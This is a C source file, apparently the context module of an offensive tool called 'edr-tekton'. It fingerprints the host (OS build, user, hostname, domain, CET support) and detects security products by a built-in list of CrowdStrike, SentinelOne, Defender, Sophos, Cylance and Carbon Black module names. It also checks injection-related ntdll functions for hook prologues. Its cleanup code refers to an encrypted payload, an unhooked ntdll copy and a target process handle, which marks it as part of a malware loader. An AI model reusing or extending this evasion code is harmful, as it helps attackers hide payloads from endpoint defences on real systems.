/*
 * edr-tekton :: Runtime Context
 * Environment fingerprinting and state management.
 */

#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include "tekton/core/context.h"
#include "tekton/core/log.h"

TEKTON_STATUS TektonContextInit(PTEKTON_CONTEXT ctx) {
    if (!ctx) return TEKTON_ERR_INVALID_PARAM;

    memset(ctx, 0, sizeof(TEKTON_CONTEXT));
    ctx->verbose = FALSE;
    ctx->dry_run = FALSE;
    ctx->target_pid = 0;
    ctx->target_handle = NULL;
    ctx->remote_base = NULL;

    TLOG_DEBUG("Context initialized");
    return TEKTON_OK;
}

TEKTON_STATUS TektonContextFingerprint(PTEKTON_CONTEXT ctx) {
    if (!ctx) return TEKTON_ERR_INVALID_PARAM;

#ifdef _WIN32
    /* ── OS Version ──────────────────────────────────── */

    /* Use RtlGetVersion to get accurate version (unlike GetVersionEx) */
    typedef NTSTATUS (WINAPI *fnRtlGetVersion)(PRTL_OSVERSIONINFOW);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        fnRtlGetVersion pRtlGetVersion = (fnRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
        if (pRtlGetVersion) {
            RTL_OSVERSIONINFOW osvi = { 0 };
            osvi.dwOSVersionInfoSize = sizeof(osvi);
            if (NT_SUCCESS(pRtlGetVersion(&osvi))) {
                ctx->os.major_version = osvi.dwMajorVersion;
                ctx->os.minor_version = osvi.dwMinorVersion;
                ctx->os.build_number = osvi.dwBuildNumber;
            }
        }
    }

    ctx->os.is_win11 = (ctx->os.build_number >= 22000);

    /* Architecture */
    SYSTEM_INFO si = { 0 };
    GetNativeSystemInfo(&si);
    ctx->os.is_x64 = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);

    /* WoW64 check */
    typedef BOOL (WINAPI *fnIsWow64Process)(HANDLE, PBOOL);
    fnIsWow64Process pIsWow64 = (fnIsWow64Process)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "IsWow64Process");
    if (pIsWow64) {
        BOOL wow64 = FALSE;
        pIsWow64(GetCurrentProcess(), &wow64);
        ctx->os.is_wow64 = wow64;
    }

    /* Hostname */
    DWORD hostname_len = sizeof(ctx->os.hostname);
    GetComputerNameA(ctx->os.hostname, &hostname_len);

    /* Username */
    DWORD username_len = sizeof(ctx->os.username);
    GetUserNameA(ctx->os.username, &username_len);

    /* Domain */
    WCHAR domain_buf[256] = { 0 };
    DWORD domain_len = 256;
    LPWSTR domain_ptr = NULL;
    typedef NET_API_STATUS (WINAPI *fnNetGetJoinInformation)(LPCWSTR, LPWSTR*, DWORD*);
    /* Simpler: just use environment variable */
    GetEnvironmentVariableA("USERDOMAIN", ctx->os.domain, sizeof(ctx->os.domain));

    /* CET detection */
    ctx->os.has_cet = FALSE;
    /* Check via GetProcessMitigationPolicy if available */
    typedef BOOL (WINAPI *fnGetProcessMitigationPolicy)(HANDLE, DWORD, PVOID, SIZE_T);
    fnGetProcessMitigationPolicy pGetMit = (fnGetProcessMitigationPolicy)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "GetProcessMitigationPolicy");
    if (pGetMit) {
        /* PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY = 18 */
        DWORD policy[2] = { 0 };
        if (pGetMit(GetCurrentProcess(), 18, &policy, sizeof(policy))) {
            ctx->os.has_cet = (policy[0] & 1); /* EnableUserShadowStack bit */
        }
    }

    TLOG_INFO("Fingerprint: %s@%s.%s build=%lu arch=%s win11=%s cet=%s",
        ctx->os.username, ctx->os.hostname, ctx->os.domain,
        ctx->os.build_number,
        ctx->os.is_x64 ? "x64" : "x86",
        ctx->os.is_win11 ? "yes" : "no",
        ctx->os.has_cet ? "yes" : "no");

#else
    /* Non-Windows: dev mode fingerprint */
    ctx->os.major_version = 10;
    ctx->os.build_number = 19045;
    ctx->os.is_x64 = TRUE;
    strncpy(ctx->os.hostname, "dev-machine", sizeof(ctx->os.hostname) - 1);
    strncpy(ctx->os.username, "researcher", sizeof(ctx->os.username) - 1);
    strncpy(ctx->os.domain, "WORKGROUP", sizeof(ctx->os.domain) - 1);

    TLOG_INFO("Fingerprint: dev mode (non-Windows build)");
#endif

    return TEKTON_OK;
}

TEKTON_STATUS TektonContextDetectEDR(PTEKTON_CONTEXT ctx) {
    if (!ctx) return TEKTON_ERR_INVALID_PARAM;

#ifdef _WIN32
    /* Known EDR DLL signatures */
    static const struct {
        const char* dll_name;
        const char* edr_name;
    } edr_signatures[] = {
        { "CrowdStrike\\CSFalconService",   "crowdstrike"   },
        { "ctiuser.dll",                     "crowdstrike"   },
        { "SentinelAgent.exe",               "sentinelone"   },
        { "InProcessClient64.dll",           "sentinelone"   },
        { "MsMpEng.exe",                     "defender"      },
        { "mpclient.dll",                    "defender"      },
        { "SophosSAVService.exe",            "sophos"        },
        { "savapi.dll",                      "sophos"        },
        { "CylanceSvc.exe",                  "cylance"       },
        { "CyMemDef64.dll",                  "cylance"       },
        { "cb.exe",                          "carbonblack"   },
        { "cbdll.dll",                       "carbonblack"   },
        { NULL, NULL }
    };

    /* Check for EDR DLLs in current process */
    ctx->edr.hooked_dll_count = 0;
    for (int i = 0; edr_signatures[i].dll_name != NULL; i++) {
        HMODULE hMod = GetModuleHandleA(edr_signatures[i].dll_name);
        if (hMod) {
            strncpy(ctx->edr.name, edr_signatures[i].edr_name, sizeof(ctx->edr.name) - 1);
            if (ctx->edr.hooked_dll_count < TEKTON_MAX_EDR_DLLS) {
                strncpy(ctx->edr.hooked_dlls[ctx->edr.hooked_dll_count],
                    edr_signatures[i].dll_name,
                    sizeof(ctx->edr.hooked_dlls[0]) - 1);
                ctx->edr.hooked_dll_count++;
            }
        }
    }

    /* Check ntdll hooks by examining prologue bytes */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        static const char* check_funcs[] = {
            "NtAllocateVirtualMemory",
            "NtWriteVirtualMemory",
            "NtProtectVirtualMemory",
            "NtCreateThreadEx",
            "NtMapViewOfSection",
            "NtQueueApcThread",
            NULL
        };

        ctx->edr.hooked_count = 0;
        for (int i = 0; check_funcs[i] != NULL; i++) {
            PVOID func = (PVOID)GetProcAddress(hNtdll, check_funcs[i]);
            if (func) {
                BYTE* bytes = (BYTE*)func;
                /* Check for JMP/CALL hook at prologue */
                /* Normal: 4C 8B D1 (mov r10, rcx) */
                /* Hooked: E9 xx xx xx xx (jmp) or FF 25 (jmp [rip+x]) */
                if (bytes[0] == 0xE9 || bytes[0] == 0xFF ||
                    (bytes[0] == 0x48 && bytes[1] == 0xB8)) {
                    ctx->edr.hooked_count++;
                    ctx->edr.hooks_detected = TRUE;
                }
            }
        }
    }

    if (ctx->edr.hooks_detected) {
        TLOG_WARN("EDR detected: %s (%lu hooks found)",
            ctx->edr.name[0] ? ctx->edr.name : "unknown",
            ctx->edr.hooked_count);
    } else {
        TLOG_INFO("No EDR hooks detected");
    }

#else
    /* Dev mode: simulate no EDR */
    strncpy(ctx->edr.name, "none", sizeof(ctx->edr.name) - 1);
    ctx->edr.hooks_detected = FALSE;
    TLOG_INFO("EDR detection: dev mode (no EDR simulated)");
#endif

    return TEKTON_OK;
}

VOID TektonContextCleanup(PTEKTON_CONTEXT ctx) {
    if (!ctx) return;

    /* Secure-zero sensitive data */
    if (ctx->payload.data) {
        TEKTON_SECURE_ZERO(ctx->payload.data, ctx->payload.capacity);
    }
    if (ctx->decrypted.data) {
        TEKTON_SECURE_ZERO(ctx->decrypted.data, ctx->decrypted.capacity);
    }
    if (ctx->resolved.clean_ntdll_text) {
        TEKTON_SECURE_ZERO(ctx->resolved.clean_ntdll_text, ctx->resolved.clean_ntdll_text_size);
    }

#ifdef _WIN32
    if (ctx->target_handle) {
        CloseHandle(ctx->target_handle);
        ctx->target_handle = NULL;
    }
#endif

    TEKTON_SECURE_ZERO(&ctx->resolved, sizeof(ctx->resolved));

    TLOG_DEBUG("Context cleaned up");
}

VOID TektonContextSetError(
    PTEKTON_CONTEXT ctx,
    TEKTON_STATUS   status,
    const char*     fmt,
    ...
) {
    if (!ctx) return;

    ctx->last_error = status;

    if (fmt) {
        va_list args;
        va_start(args, fmt);
        vsnprintf(ctx->last_error_msg, sizeof(ctx->last_error_msg) - 1, fmt, args);
        va_end(args);

        TLOG_ERROR("%s", ctx->last_error_msg);
    }
}
